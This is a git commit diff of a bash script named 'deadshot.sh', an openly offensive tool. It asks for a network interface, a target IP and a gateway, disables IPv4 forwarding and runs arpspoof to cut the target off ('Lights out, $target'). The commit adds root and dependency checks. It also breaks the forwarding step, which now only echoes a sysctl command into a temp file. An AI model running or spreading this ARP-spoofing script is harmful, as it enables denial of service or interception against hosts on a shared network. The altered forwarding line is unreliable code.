eaffda94514a74198f1ecb1dc1ee93acfe23a87b
jon-boopin <jon-boopin@github.com>
2020-09-04 17:42:40 -0700

    Adds sudo request and dependency check

--- deadshot.sh
+++ deadshot.sh
@@ -1,4 +1,13 @@
 #!/bin/bash
+
+#Request for sudo
+if [ "$(id -u)" -ne 0 ]; then
+        echo 'This script must be run as root.' >&2
+        exit 1
+fi
+
+tput setaf 2
+
 echo "______                   _       _             _   ";
 echo "|  _  \                 | |     | |           | |  ";
 echo "| | | |  ___   __ _   __| | ___ | |__    ___ _| |__ ";
@@ -11,12 +20,7 @@ echo  Enter the interface to listen on, the host IP address, and
 echo  their gateway. You must have arpspoof installed. IPv4 forwarding
 echo  will be disabled.
 echo #
-if [ "$(id -u)" -ne 0 ]; then
-        echo 'This script must be run by root.' >&2
-        exit 1
-fi
-
-#The script takes the input for the interface, target, and router.
+#the script takes the input for the interface, target, and router
 read -p "[Deadshot] Enter the name of the inteface you're listening on: " interface
 echo #
 echo "[Deadshot] Listening on interface" $interface
@@ -29,23 +33,25 @@ read -p "[Deadshot] Enter the ARP table's host address (Router): " host
 echo #
 echo "[Deadshot] Target's Gateway: $host" 
 echo #
+#dependency check
 echo "[Deadshot] Checking for dependencies..."
 wait
-
+echo #
 #if else statement for arpspoof 
 if command -v arpspoof >/dev/null 2>&1 ; then
     echo "[Deadshot] arpspoof found..."
+    echo #
 else
     echo "[Deadshot] arpspoof not found. You can install arpspoof with 'sudo apt-get install dsniff'."
 	exit 1
 fi
+#disables IPv4 forwarding
 echo "[Deadshot] Disabling IPv4 forwarding..."
 wait
-
-#disabling IPv4 forwarding
-echo "0" >> /proc/sys/net/ipv4/ip_forward
+echo sysctl -w net.ipv4.ip_forward=0 > /tmp/out
 wait
-echo "[Deadshot] Lights out, $target."
+echo #
+echo "[Deadshot] Lights out, $target"
 wait
 echo #
 arpspoof -i $interface -t $target -r $host
